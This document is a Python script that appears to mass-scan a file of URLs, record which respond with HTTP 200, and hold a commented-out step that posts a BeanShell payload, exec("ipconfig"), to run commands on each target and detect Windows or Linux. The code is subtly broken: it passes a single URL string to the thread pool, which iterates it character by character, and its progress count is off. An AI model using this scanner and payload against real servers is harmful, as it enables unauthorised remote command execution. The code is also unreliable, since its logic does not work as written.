# -*- coding: utf-8 -*-
import requests
import re
import sys
import threadpool
inFileName = "test.txt"
outFileName = "200.txt"
outFile = open(outFileName,'w')
num=1
success=0
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3298.4 Safari/537.36'
}
bar_len = 60
# login_data = {
#          'bsh.script': 'exec("ipconfig");'
# }
    
def url200(url):
    global success,num
    # try:
    print(url)
    res = requests.get(url) #, headers=header, timeout=3
    
    code = res.status_code
    if code == 200:
        success += 1
        outFile.write('200  ' + url+'\n')
        # res = session.post(url, data=login_data)
        # # res = session.get(url)
        # pattern = re.compile('Windows')
        # key = re.findall(pattern,res.text)
        # if key:
        #     outFile.write('windows  200  ' + url+'\n')
        # else:
        #     outFile.write('linux  200  ' + url+'\n')
        
    # except Exception as error:
    #     pass
def run():
    global success,num
    f = open(inFileName)
    urls_data = f.readlines()
    total = str(len(urls_data))
    for url in urls_data:
        # session = requests.session()
        pool = threadpool.ThreadPool(1)
        requests = threadpool.makeRequests(url200,url)  
        [pool.putRequest(req) for req in requests]  
        pool.wait()  
        # url200(url)
        
        filled_len = int(round(bar_len * (num+1) / float(total)))
        percents = round(100.0 * (num+1) / float(total), 1)
        bar = ['='] * filled_len + ['-'] * (bar_len - filled_len)
        sys.stdout.write('[%s] %s%s %s/%s 123:%s\r' % (''.join(bar), percents, '%', num, total, success))
        sys.stdout.flush()
        num = num + 1
run()
outFile.close()
